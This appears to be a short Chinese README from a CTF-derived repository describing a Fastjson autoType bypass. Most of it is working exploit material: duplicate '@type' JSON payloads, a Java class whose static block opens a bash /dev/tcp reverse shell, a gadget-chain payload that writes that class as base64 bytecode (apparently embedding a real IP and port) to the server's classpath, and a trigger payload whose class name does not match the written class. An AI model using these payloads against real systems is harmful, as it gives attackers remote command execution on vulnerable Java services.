# Fastjsonbypass

参考ycb 2021 搭建的环境。。。

分享自己fork的项目：https://github.com/Firebasky/Fastjson  

```json
{
"keyword": 
    {"$ref": "$r2.message"}, 
"msg": 
    {
        "\u0040\u0074\u0079\u0070\u0065":"java.lang.Exception",
        "\u0040\u0074\u0079\u0070\u0065": "com.firebasky.fastjsonbypass.Exception.MyException"
    }
}
```

写文件参考：https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&mid=2247484413&idx=1&sn=1e6e6dc310896678a64807ee003c4965&scene=21#wechat_redirect

因为自己本地环境是win，而且jdk的8u201不支持这样的方法.所以使用其他方法。

```java
import java.io.IOException;
public class Cmd implements AutoCloseable{
    static{
        try{
            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do $line 2>&5 >&5; done"});
        }catch (IOException e){
            try{
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc"});
            }catch (IOException ee){
            }
        }
    }

    @Override
    public void close() throws Exception {
    }
}
```



```json
{
    "stream": {
        "\u0040\u0074\u0079\u0070\u0065": "java.lang.AutoCloseable",
        "\u0040\u0074\u0079\u0070\u0065": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
        "targetPath": "xxx//target//classes//Cmd.class",
        "tempPath": ""
    },
    "writer": {
        "\u0040\u0074\u0079\u0070\u0065": "java.lang.AutoCloseable",
        "\u0040\u0074\u0079\u0070\u0065": "com.esotericsoftware.kryo.io.Output",
        "buffer": "yv66vgAAADQAMAoADQAbCgAcAB0HAB4IAB8IACAIACEKABwAIgcAIwgAJAgAJQgAJgcAJwcAKAcAKQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAVjbG9zZQEACkV4Y2VwdGlvbnMHACoBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACMBAApTb3VyY2VGaWxlAQAIQ21kLmphdmEMAA8AEAcAKwwALAAtAQAQamF2YS9sYW5nL1N0cmluZwEACS9iaW4vYmFzaAEAAi1jAQBWZXhlYyA1PD4vZGV2L3RjcC8xLjExNi4xMzYuMTIwLzIzMzM7Y2F0IDwmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gJGxpbmUgMj4mNSA+JjU7IGRvbmUMAC4ALwEAE2phdmEvaW8vSU9FeGNlcHRpb24BAANjbWQBAAIvYwEABGNhbGMBAANDbWQBABBqYXZhL2xhbmcvT2JqZWN0AQAXamF2YS9sYW5nL0F1dG9DbG9zZWFibGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAMAA0AAQAOAAAAAwABAA8AEAABABEAAAAdAAEAAQAAAAUqtwABsQAAAAEAEgAAAAYAAQAAAAIAAQATABAAAgARAAAAGQAAAAEAAAABsQAAAAEAEgAAAAYAAQAAABAAFAAAAAQAAQAVAAgAFgAQAAEAEQAAAJkABQACAAAAPbgAAga9AANZAxIEU1kEEgVTWQUSBlO2AAdXpwAiS7gAAga9AANZAxIJU1kEEgpTWQUSC1O2AAdXpwAETLEAAgAAABoAHQAIAB4AOAA7AAgAAgASAAAAHgAHAAAABQAaAAsAHQAGAB4ACAA4AAoAOwAJADwADAAXAAAAFgADXQcAGP8AHQABBwAYAAEHABj6AAAAAQAZAAAAAgAa",
        "outputStream": {
            "$ref": "$.stream"
        },
        "position": 822//通过wc 命令统计
    },
    "close": {
        "\u0040\u0074\u0079\u0070\u0065": "java.lang.AutoCloseable",
        "\u0040\u0074\u0079\u0070\u0065": "com.sleepycat.bind.serial.SerialOutput",
        "out": {
            "$ref": "$.writer"
        }
    }
}
```

然后触发

```json
{
    "@type":"java.lang.AutoCloseable",
    "@type":"EvilRevShell"
}
```



> wp
>
> https://mp.weixin.qq.com/s?__biz=MzkzMDE3NDE0Ng==&mid=2247487895&idx=1&sn=9cddec9d155206b721f7bf5c500322ab&chksm=c27f143af5089d2ca73b9b7e91c2c6d2348f64bbf2823aced803942b91bb92caac1f1344dfe7&mpshare=1&scene=23&srcid=0917WU0MhesJTOd1WidYaVwo&sharer_sharetime=1631877198670&sharer_shareid=6bef27d5dc0c6f8f47cc0ce866d080b7#rd